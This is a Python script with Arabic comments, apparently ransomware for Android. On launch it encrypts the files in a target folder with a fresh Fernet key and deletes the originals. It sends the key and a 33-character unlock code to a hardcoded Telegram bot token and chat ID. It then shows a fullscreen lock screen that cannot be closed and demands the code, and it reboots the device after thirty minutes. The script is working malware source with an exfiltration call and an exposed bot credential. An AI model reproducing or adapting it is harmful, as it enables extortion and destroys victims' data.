import os
import random
import string
import requests
import tkinter as tk
from tkinter import messagebox
from io import BytesIO
from PIL import Image, ImageTk
from cryptography.fernet import Fernet

# --- 1. إعدادات تليجرام ---
BOT_TOKEN = "8299109187:AAHuotRY20t8zCzJuqlbZofZQguPBlXJsMg"
CHAT_ID = "8111855062"

# --- 2. توليد مفتاح تشفير عشوائي ديناميكي جديد بالكامل لكل جلسة ---
dynamic_key = Fernet.generate_key()
cipher_suite = Fernet(dynamic_key)
dynamic_key_str = dynamic_key.decode()

# --- 3. تحديد المسار المراد تشفيره في الأندرويد ---
# (يمكنك جعله يشمل مجلد الذاكرة الداخلية بالكامل /sdcard أو مجلد محدد)
TARGET_DIR = "/sdcard/Download/MyWork"  # عدل المسار حسب رغبتك

def encrypt_files():
    if not os.path.exists(TARGET_DIR):
        return
    for root, dirs, files in os.walk(TARGET_DIR):
        for file in files:
            file_path = os.path.join(root, file)
            # استثناء ملفات الـ enc والسكريبت نفسه
            if file.endswith(".enc") or file.endswith(".py"):
                continue
            try:
                with open(file_path, "rb") as f:
                    file_data = f.read()
                encrypted_data = cipher_suite.encrypt(file_data)
                enc_path = file_path + ".enc"
                with open(enc_path, "wb") as f:
                    f.write(encrypted_data)
                os.remove(file_path)
            except Exception:
                pass

def decrypt_files():
    if not os.path.exists(TARGET_DIR):
        return
    for root, dirs, files in os.walk(TARGET_DIR):
        for file in files:
            if file.endswith(".enc"):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, "rb") as f:
                        encrypted_data = f.read()
                    decrypted_data = cipher_suite.decrypt(encrypted_data)
                    orig_path = file_path[:-4] # إزالة الامتداد .enc
                    with open(orig_path, "wb") as f:
                        f.write(decrypted_data)
                    os.remove(file_path)
                except Exception:
                    pass

# تشفير الملفات فور التشغيل
encrypt_files()

# --- 4. توليد رمز عشوائي بطول 33 خانة وإرساله مع المفتاح الديناميكي إلى تليجرام ---
chars = string.ascii_letters + string.digits
random_code = "".join(random.choices(chars, k=33))

message = (
    f"🚨 [ANDROID ULTRA SECURE] تم تشفير الجهاز بمفتاح عشوائي فريد.\n\n"
    f"🔑 **مفتاح التشفير (Fernet Key):** `{dynamic_key_str}`\n\n"
    f"🔐 **رمز فتح الشاشة (33 خانة):** `{random_code}`"
)

telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
payload = {
    "chat_id": CHAT_ID,
    "text": message,
    "parse_mode": "Markdown"
}

try:
    requests.post(telegram_url, json=payload)
except Exception:
    pass

# --- 5. بناء واجهة شاشة القفل (Tkinter مع صورة نابليون) ---
root = tk.Tk()
root.attributes("-fullscreen", True)
root.title("Android Full Lockdown")

# تحميل صورة نابليون كخلفية لملء الشاشة
try:
    image_url = "https://upload.wikimedia.org/wikipedia/commons/b/b2/Napole%C3%B3n_en_San_Bernardo_-_David.jpg"
    image_data = requests.get(image_url).content
    img = Image.open(BytesIO(image_data))
    
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    img = img.resize((screen_width, screen_height), Image.Resampling.LANCZOS)
    
    bg_image = ImageTk.PhotoImage(img)
    bg_label = tk.Label(root, image=bg_image)
    bg_label.place(relwidth=1, relheight=1)
except Exception:
    root.configure(bg="black")

# التنبيه النصي مع عبارة "حط الرقم تشوف كل شي"
label = tk.Label(root, text="🛡️ جهازك مشفر بالكامل بمفتاح عشوائي ديناميكي.\nحط الرقم تشوف كل شي! (الرمز المرسل إلى تليجرام مطلوب):", 
                 fg="white", bg="#222222", font=("Arial", 12, "bold"))
label.pack(pady=120)

entry = tk.Entry(root, font=("Consolas", 16), width=30, show="*")
entry.pack(pady=20)

def check_code():
    if entry.get().strip() == random_code:
        # إلغاء المؤقت وفك التشفير واستعادة الملفات
        root.after_cancel(timer_id)
        decrypt_files()
        root.destroy()
    else:
        messagebox.showerror("خطأ أمني", "الرمز غير صحيح!")

btn = tk.Button(root, text="Unlock System", command=check_code, font=("Arial", 14, "bold"), bg="darkred", fg="white", width=15, height=2)
btn.pack(pady=20)

# --- 6. المؤقت الزمني (30 دقيقة = 1,800,000 مللي ثانية) وإعادة التشغيل ---
def timeout_action():
    root.destroy()
    # إعادة تشغيل هاتف الأندرويد (تتطلب صلاحيات الروت Root لتعمل بشكل كامل، أو ستغلق الواجهة)
    os.system("reboot")

timer_id = root.after(1800000, timeout_action)

# منع إغلاق النافذة يدوياً
def prevent_close():
    pass
root.protocol("WM_DELETE_WINDOW", prevent_close)

root.mainloop()
